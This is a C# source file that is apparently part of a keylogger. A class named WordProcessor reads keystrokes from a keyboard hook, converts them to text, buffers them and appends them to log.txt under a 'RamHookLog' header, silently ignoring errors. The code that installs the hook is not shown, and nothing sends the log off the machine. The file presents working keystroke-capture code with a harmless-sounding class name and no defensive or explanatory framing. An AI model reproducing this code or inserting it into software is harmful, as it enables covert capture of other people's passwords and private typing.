﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ControlMiner
{
    public class WordProcessor
    {
        /// <summary>
        /// current pressed keys cache
        /// stores keys and empties itself after flushing
        /// </summary>
        private string cache = "";

        /// <summary>
        /// Gets string representation of provided key code
        /// </summary>
        /// <param name="vk">virtual key code</param>
        /// <returns>readable key code text</returns>
        public string GetKeyString(VKeys vk)
        {
            string name = Enum.GetName(typeof(VKeys), vk);
            if (!string.IsNullOrEmpty(name))
            {
                // represent a-z & 0-9 keys
                if (name.Contains("KEY_"))
                {
                    return name.Remove(0, 4);
                }
            }

            // display SPACE key as ' '
            if (vk == VKeys.SPACE)
            {
                return " ";
            }

            // enter should be represented as a new line
            if (vk == VKeys.RETURN)
            {
                return "\r\n";
            }

            return "[" + name + "]";
        }

        /// <summary>
        /// Processes the keyboard events
        /// </summary>
        public void ProcessHook(IntPtr wParam, IntPtr lParam)
        {
            int key = Marshal.ReadInt32(lParam);

            // add to cache
            cache += GetKeyString((VKeys)key);

            ProcessKeywords();

            // cache full? let's flush
            if (cache.Length >= 256)
            {
                ActionFlush();
            }
        }

        /// <summary>
        /// Performs ana action if the specified keyword is entered
        /// </summary>
        private void ProcessKeywords()
        {

        }

        /// <summary>
        /// Flush the cache to log file
        /// </summary>
        public void ActionFlush()
        {
            //if (Properties.Settings.Default.uppercase == false)
            //{
            //    cache = cache.ToLower();
            //}

            try
            {
                File.AppendAllText("log.txt", cache);
                cache = "";
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Session started. Write the header to the log file
        /// </summary>
        public void PrepareFile()
        {
            try
            {

                File.AppendAllText("log.txt", "\r\n\r\n\r\n==============================================");
                File.AppendAllText("log.txt", "\r\nRamHookLog - " + DateTime.Now.ToString());
                File.AppendAllText("log.txt", "\r\n==============================================\r\n");
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Clear log file
        /// </summary>
        public void ClearLogFile()
        {
            try
            {
                File.WriteAllText("log.txt", "");
            }
            catch (Exception)
            {
            }
        }
    }
}
